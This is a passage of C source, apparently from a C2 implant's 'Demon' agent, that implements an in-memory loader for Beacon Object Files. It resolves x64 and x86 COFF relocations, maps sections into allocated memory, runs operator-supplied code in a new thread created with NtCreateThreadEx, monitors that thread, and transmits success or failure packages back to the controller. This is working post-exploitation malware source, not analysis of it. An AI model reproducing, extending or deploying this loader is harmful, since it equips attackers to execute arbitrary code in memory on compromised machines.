                Offset = *( PUINT32 ) ( RelocAddr );

                Offset += U_PTR( SymbolSectionAddr ) - U_PTR( RelocAddr ) - sizeof( UINT32 ) - 4;

                *( ( PUINT32 ) RelocAddr ) = Offset;
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_5 && FuncPtr == NULL )
            {
                Offset = *( PUINT32 ) ( RelocAddr );

                Offset += U_PTR( SymbolSectionAddr ) - U_PTR( RelocAddr ) - sizeof( UINT32 ) - 5;

                *( ( PUINT32 ) RelocAddr ) = Offset;
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_ADDR32NB && FuncPtr == NULL )
            {
                Offset = *( PUINT32 ) ( RelocAddr );

                Offset += U_PTR( SymbolSectionAddr ) - U_PTR( RelocAddr ) - sizeof( UINT32 );

                *( ( PUINT32 ) RelocAddr ) = Offset;
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_ADDR64 && FuncPtr == NULL )
            {
                OffsetLong = *( PUINT64 ) ( RelocAddr );

                OffsetLong += U_PTR( SymbolSectionAddr );

                *( ( PUINT64 ) RelocAddr ) = OffsetLong;
            }
#else
                if ( Coffee->Reloc->Type == IMAGE_REL_I386_REL32 && FuncPtr == NULL )
            {
                Offset = *( PUINT32 ) ( RelocAddr );

                Offset += U_PTR( SymbolSectionAddr ) - U_PTR( RelocAddr ) - sizeof( UINT32 );

                *( ( PUINT32 ) RelocAddr ) = Offset;
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_I386_DIR32 && FuncPtr != NULL )
            {
                *( ( PVOID* ) FunMapAddr ) = FuncPtr;

                Offset = U_PTR( FunMapAddr );

                *( ( PUINT32 ) RelocAddr ) = Offset;

                FuncCount++;
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_I386_DIR32 && FuncPtr == NULL )
            {
                Offset = *( PUINT32 ) ( RelocAddr );

                Offset += U_PTR( SymbolSectionAddr );

                *( ( PUINT32 ) RelocAddr ) = Offset;
            }
#endif
            else
            {
                if ( FuncPtr )
                {
                    PRINTF( "[!] Relocation type %d for Symbol %s not supported\n", Coffee->Reloc->Type, SymbolName );
                }
                else
                {
                    PRINTF( "[!] Relocation type not found: %d\n", Coffee->Reloc->Type );
                }

                return FALSE;
            }

            Coffee->Reloc = C_PTR( U_PTR( Coffee->Reloc ) + sizeof( COFF_RELOC ) );
        }
    }

    return TRUE;
}

// calculate how many __imp_* function there are
SIZE_T CoffeeGetFunMapSize( PCOFFEE Coffee )
{
    CHAR         SymName[9]    = { 0 };
    PCHAR        SymbolName    = NULL;
    ULONG        NumberOfFuncs = 0;
    PCOFF_SYMBOL Symbol        = NULL;

    for ( UINT16 SectionCnt = 0; SectionCnt < Coffee->Header->NumberOfSections; SectionCnt++ )
    {
        Coffee->Section = C_PTR( U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SectionCnt ) );
        Coffee->Reloc   = C_PTR( U_PTR( Coffee->Data ) + Coffee->Section->PointerToRelocations );

        for ( DWORD RelocCnt = 0; RelocCnt < Coffee->Section->NumberOfRelocations; RelocCnt++ )
        {
            Symbol = &Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ];

            if ( Symbol->First.Value[ 0 ] != 0 )
            {
                // if the symbol is 8 bytes long, it will not be terminated by a null byte
                MemSet( SymName, 0, sizeof( SymName ) );
                MemCopy( SymName, Symbol->First.Name, 8 );
                SymbolName = SymName;
            }
            else
            {
                // in this scenario, we can trust that the symbol ends with a null byte
                SymbolName = ( ( PCHAR ) ( Coffee->Symbol + Coffee->Header->NumberOfSymbols ) ) + Symbol->First.Value[ 1 ];
            }

            // if the symbol starts with __imp_, count it
            if ( HashEx( SymbolName, SYMB_COF_SIZE, FALSE ) == SYMB_COF )
                NumberOfFuncs++;

            Coffee->Reloc = C_PTR( U_PTR( Coffee->Reloc ) + sizeof( COFF_RELOC ) );
        }
    }

    return sizeof( PVOID ) * NumberOfFuncs;
}

VOID RemoveCoffeeFromInstance( PCOFFEE Coffee )
{
    PCOFFEE Entry = Instance->Coffees;
    PCOFFEE Last  = Entry;

    if ( ! Coffee )
        return;

    if ( Entry && Entry->RequestID == Coffee->RequestID )
    {
        Instance->Coffees = Entry->Next;
        return;
    }

    Entry = Entry->Next;
    while ( Entry )
    {
        if ( Entry->RequestID == Coffee->RequestID )
        {
            Last->Next = Entry->Next;
            return;
        }

        Last  = Entry;
        Entry = Entry->Next;
    }

    PUTS( "Coffe entry was not found" )
}

VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize, UINT32 RequestID )
{
    PCOFFEE Coffee   = NULL;
    PVOID   NextBase = NULL;
    BOOL    Success  = FALSE;

    PRINTF( "[EntryName: %s] [CoffeeData: %p] [ArgData: %p] [ArgSize: %ld]\n", EntryName, CoffeeData, ArgData, ArgSize )

    if ( ! CoffeeData )
    {
        PUTS( "[!] Coffee data is empty" );
        goto END;
    }

    // Create agent state backup before risky BOF execution
    CreateAgentStateBackup();

    /*
     * The BOF will be allocated as one big chunk of memory
     * all sections are kept page aligned
     * the FunctionMap stored at the end to prevent
     * reloc 32-bit offsets to overflow
     */

    Coffee            = Instance->Win32.LocalAlloc( LPTR, sizeof( COFFEE ) );
    Coffee->Data      = CoffeeData;
    Coffee->Header    = Coffee->Data;
    Coffee->Symbol    = C_PTR( U_PTR( Coffee->Data ) + Coffee->Header->PointerToSymbolTable );
    Coffee->RequestID = RequestID;
    Coffee->Next      = Instance->Coffees;
    Instance->Coffees  = Coffee;

#if _WIN64

    if ( Coffee->Header->Machine != IMAGE_FILE_MACHINE_AMD64 )
    {
        PUTS( "The BOF is not AMD64" );
        goto END;
    }

#else

    if ( Coffee->Header->Machine == IMAGE_FILE_MACHINE_AMD64 )
    {
        PUTS( "The BOF is AMD64" );
        goto END;
    }

#endif

    Coffee->SecMap     = Instance->Win32.LocalAlloc( LPTR, Coffee->Header->NumberOfSections * sizeof( SECTION_MAP ) );
    Coffee->FunMapSize = CoffeeGetFunMapSize( Coffee );

    if ( ! Coffee->SecMap )
    {
        PUTS( "Failed to allocate memory" )
        goto END;
    }

    // calculate the size of the entire BOF
    for ( UINT16 SecCnt = 0 ; SecCnt < Coffee->Header->NumberOfSections; SecCnt++ )
    {
        Coffee->Section  = C_PTR( U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SecCnt ) );
        Coffee->BofSize += Coffee->Section->SizeOfRawData;
        Coffee->BofSize  = ( SIZE_T ) ( ULONG_PTR ) PAGE_ALLIGN( Coffee->BofSize );
    }

    // at the bottom of the BOF, store the Function map, to ensure all reloc offsets are below 4K
    Coffee->BofSize += Coffee->FunMapSize;

    // Use enhanced allocation with fallback strategies
    Coffee->ImageBase = SafeVirtualAlloc( Coffee->BofSize, PAGE_READWRITE );
    if ( ! Coffee->ImageBase )
    {
        PUTS( "Failed to allocate memory for the BOF using all strategies" )
        RestoreAgentState(); // Restore agent state on critical failure
        goto END;
    }

    NextBase = Coffee->ImageBase;
    for ( UINT16 SecCnt = 0 ; SecCnt < Coffee->Header->NumberOfSections; SecCnt++ )
    {
        Coffee->Section               = C_PTR( U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SecCnt ) );
        Coffee->SecMap[ SecCnt ].Size = Coffee->Section->SizeOfRawData;
        Coffee->SecMap[ SecCnt ].Ptr  = NextBase;

        NextBase += Coffee->Section->SizeOfRawData;
        NextBase  = PAGE_ALLIGN( NextBase );

        PRINTF( "Coffee->SecMap[ %d ].Ptr => %p\n", SecCnt, Coffee->SecMap[ SecCnt ].Ptr )

        MemCopy( Coffee->SecMap[ SecCnt ].Ptr, C_PTR( U_PTR( CoffeeData ) + Coffee->Section->PointerToRawData ), Coffee->Section->SizeOfRawData );
    }

    // the FunMap is stored directly after the BOF
    Coffee->FunMap = NextBase;

    if ( ! CoffeeProcessSections( Coffee ) )
    {
        PUTS( "[*] Failed to process relocation" );
        RestoreAgentState(); // Restore agent state on relocation failure
        goto END;
    }

    Success = CoffeeExecuteFunction( Coffee, EntryName, ArgData, ArgSize, RequestID );

    // If execution failed, attempt recovery
    if ( !Success )
    {
        PUTS( "[!] BOF execution failed - attempting agent recovery" );
        RestoreAgentState();
    }

END:
    PUTS( "[*] Cleanup memory" );
    CoffeeCleanup( Coffee );

    if ( Success )
    {
        PPACKAGE Package = PackageCreateWithRequestID( DEMON_COMMAND_INLINE_EXECUTE, RequestID );
        PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_RAN_OK );
        PackageTransmit( Package );
    }
    else
    {
        PPACKAGE Package = PackageCreateWithRequestID( DEMON_COMMAND_INLINE_EXECUTE, RequestID );
        PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_COULD_NO_RUN );
        PackageTransmit( Package );
        
        // Additional recovery attempt for critical failures
        RestoreAgentState();
    }

    // **FIX**: Mark BOF request as completed for coordination with protection system
    //extern VOID AddHandledRequest( UINT32 RequestID );
    //AddHandledRequest( RequestID );

    RemoveCoffeeFromInstance( Coffee );

    if ( Coffee )
    {
        MemSet( Coffee, 0, sizeof( Coffee ) );
        Instance->Win32.LocalFree( Coffee );
        Coffee = NULL;
    }
}

// Add thread to monitoring
PTHREAD_MONITOR AddThreadMonitor( HANDLE ThreadHandle, DWORD ThreadId, UINT32 RequestID )
{
    // Simple thread safety using basic counter (this is adequate for BOF monitoring)
    if ( ThreadMonitorCount >= 32 )
        return NULL;
    
    for ( int i = 0; i < 32; i++ )
    {
        if ( !ThreadMonitors[i].IsRunning )
        {
            ThreadMonitors[i].ThreadHandle = ThreadHandle;
            ThreadMonitors[i].ThreadId = ThreadId;
            ThreadMonitors[i].RequestID = RequestID;
            ThreadMonitors[i].IsRunning = TRUE;
            ThreadMonitors[i].RequiresCleanup = FALSE;
            // Get current system time as FILETIME and convert to LARGE_INTEGER
            FILETIME fileTime;
            Instance->Win32.GetSystemTimeAsFileTime( &fileTime );
            ThreadMonitors[i].StartTime.LowPart = fileTime.dwLowDateTime;
            ThreadMonitors[i].StartTime.HighPart = fileTime.dwHighDateTime;
            ThreadMonitorCount++;
            return &ThreadMonitors[i];
        }
    }
    
    return NULL;
}

// Remove thread from monitoring
VOID RemoveThreadMonitor( DWORD ThreadId )
{
    for ( int i = 0; i < 32; i++ )
    {
        if ( ThreadMonitors[i].IsRunning && ThreadMonitors[i].ThreadId == ThreadId )
        {
            MemSet( &ThreadMonitors[i], 0, sizeof( THREAD_MONITOR ) );
            ThreadMonitorCount--;
            break;
        }
    }
}

// Enhanced CoffeeRunner with thread monitoring
VOID CoffeeRunner( PCHAR EntryName, DWORD EntryNameSize, PVOID CoffeeData, SIZE_T CoffeeDataSize, PVOID ArgData, SIZE_T ArgSize, UINT32 RequestID )
{
    PCOFFEE_PARAMS CoffeeParams = NULL;
    INJECTION_CTX  InjectionCtx = { 0 };
    HANDLE         ThreadHandle = NULL;
    DWORD          ThreadId = 0;
    PTHREAD_MONITOR Monitor = NULL;
#if _WIN64
    BOOL           x64          = TRUE;
#else
    BOOL           x64          = FALSE;
#endif

    // Allocate memory
    CoffeeParams                 = Instance->Win32.LocalAlloc( LPTR, sizeof( COFFEE_PARAMS ) );
    CoffeeParams->EntryName      = Instance->Win32.LocalAlloc( LPTR, EntryNameSize );
    CoffeeParams->CoffeeData     = Instance->Win32.LocalAlloc( LPTR, CoffeeDataSize );
    CoffeeParams->ArgData        = Instance->Win32.LocalAlloc( LPTR, ArgSize );
    CoffeeParams->EntryNameSize  = EntryNameSize;
    CoffeeParams->CoffeeDataSize = CoffeeDataSize;
    CoffeeParams->ArgSize        = ArgSize;
    CoffeeParams->RequestID      = RequestID;

    MemCopy( CoffeeParams->EntryName,  EntryName,  EntryNameSize  );
    MemCopy( CoffeeParams->CoffeeData, CoffeeData, CoffeeDataSize );
    MemCopy( CoffeeParams->ArgData,    ArgData,    ArgSize        );

    InjectionCtx.Parameter = CoffeeParams;

    Instance->Threads++;

    ThreadHandle = ThreadCreate( THREAD_METHOD_NTCREATETHREADEX, NtCurrentProcess(), x64, CoffeeRunnerThread, CoffeeParams, &ThreadId );
    if ( ThreadHandle ) 
    {
        // Add thread to monitoring system
        Monitor = AddThreadMonitor( ThreadHandle, ThreadId, RequestID );
        if ( !Monitor )
        {
            PUTS( "Warning: Failed to add thread to monitoring system" );
        }
        
        PRINTF( "Created BOF thread: %d (RequestID: %x)\n", ThreadId, RequestID );
    } 
    else 
    {
        PRINTF( "Failed to create new CoffeeRunnerThread thread: %d", NtGetLastError() )
        PACKAGE_ERROR_WIN32
        
        // Cleanup on failure
        DATA_FREE( CoffeeParams->EntryName,  CoffeeParams->EntryNameSize );
        DATA_FREE( CoffeeParams->CoffeeData, CoffeeParams->CoffeeDataSize );
        DATA_FREE( CoffeeParams->ArgData,    CoffeeParams->ArgSize );
        DATA_FREE( CoffeeParams,             sizeof( COFFEE_PARAMS ) );
        Instance->Threads--;
    }
}

// Enhanced CoffeeRunnerThread with monitoring integration
VOID CoffeeRunnerThread( PCOFFEE_PARAMS Param )
{
    DWORD CurrentThreadId = (DWORD)(ULONG_PTR)Instance->Teb->ClientId.UniqueThread;
    
    if ( ! Param->EntryName || ! Param->CoffeeData )
        goto ExitThread;

    PRINTF( "BOF thread %d starting execution\n", CurrentThreadId );

    CoffeeLdr( Param->EntryName, Param->CoffeeData, Param->ArgData, Param->ArgSize, Param->RequestID );

    PRINTF( "BOF thread %d completed execution\n", CurrentThreadId );

ExitThread:
    // Remove from monitoring before cleanup
    RemoveThreadMonitor( CurrentThreadId );
    
    if ( Param )
    {
        DATA_FREE( Param->EntryName,  Param->EntryNameSize );
        DATA_FREE( Param->CoffeeData, Param->CoffeeDataSize );
        DATA_FREE( Param->ArgData,    Param->ArgSize );
        DATA_FREE( Param,             sizeof( COFFEE_PARAMS ) );
    }

    JobRemove( (DWORD)(ULONG_PTR)NtCurrentTeb()->ClientId.UniqueThread );
    Instance->Threads--;

    Instance->Win32.RtlExitUserThread( 0 );
}
